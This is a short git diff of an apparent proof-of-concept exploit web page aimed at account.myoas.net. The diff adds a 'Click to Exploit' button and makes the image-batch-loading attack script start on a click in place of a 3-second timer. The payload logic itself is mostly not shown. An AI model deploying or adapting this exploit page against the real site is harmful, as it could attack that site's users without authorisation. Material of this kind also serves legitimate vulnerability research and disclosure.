@@ -9,6 +9,8 @@
 
 <body>
   checkout "https://account.myoas.net" before and after an alert shows up
+  <br><br>
+  <button onclick=run()>Click to Exploit</button>
   <script>
     // Function to generate a random string of length 10
     function generateRandomString() {
@@ -64,9 +66,9 @@
     }
 
     // Start loading images in batches
-    setTimeout(() => {
+    function run() {
       loadBatch(0);
-    }, 3000)
+    }
   </script>
 </body>
 
